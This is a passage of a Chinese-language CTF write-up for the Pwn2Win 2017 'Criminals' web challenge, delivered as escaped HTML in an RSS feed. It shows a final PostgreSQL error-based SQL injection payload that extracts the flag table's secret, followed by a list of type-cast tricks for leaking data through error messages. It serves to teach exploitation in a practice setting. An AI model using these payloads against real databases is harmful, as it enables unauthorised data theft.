+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2017/10/pwn2win-ctf-2017-write-up-web-criminals-11.png" alt="" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2017/10/pwn2win-ctf-2017-write-up-web-criminals-12.png" alt="" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;最後執行最終的 Payload 就能取得 flag：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;int4(
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; array_to_string(
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; xpath(&lt;span style="color:#e6db74"&gt;&amp;#39;row[1]&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; query_to_xml(
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;SELECT secret FROM flag&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; )
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; )
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ,&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2017/10/pwn2win-ctf-2017-write-up-web-criminals-13.png" alt="" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;總結一下，除了那簡報資料提及的 ORM Injection 技巧外，當遇到 PostgreSQL 的 Error-Based Injection 時，也能嘗試以下幾種方式將字串強制轉型成數字來達到利用 Error 獲取資料：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CAST( &amp;hellip; AS int )&lt;/li&gt;
+&lt;li&gt;CAST( ( chr(95) || &amp;hellip; ) AS int)&lt;/li&gt;
+&lt;li&gt;int4( &amp;hellip; )&lt;/li&gt;
+&lt;li&gt;int8( &amp;hellip; )&lt;/li&gt;
+&lt;li&gt;float4( &amp;hellip; )&lt;/li&gt;
+&lt;li&gt;float8( &amp;hellip; )&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;這段解題的路上真的非常坎坷，對 CTF 無經驗、對 Hibernate 毫無觀念、對 PostgreSQL 完全沒有接觸，感覺就像是裸身拿著一根樹枝參加世界大戰，在路上撿到一把左輪手槍，一路拚命爬到旗子前，結果發現大戰早已結束 N 個世紀。&lt;/p&gt;
+&lt;p&gt;但是過程中真的累積到不少寶貴、難得的經驗，很適合給像我這樣的新手作練習。似乎 Hibernate 也是很常見 Java 應用程式使用的框架，值得在有空時好好研究一下 Hibernate 的架構以及 HQL 和 SQL 的差異性。&lt;/p&gt;</description></item></channel></rss>
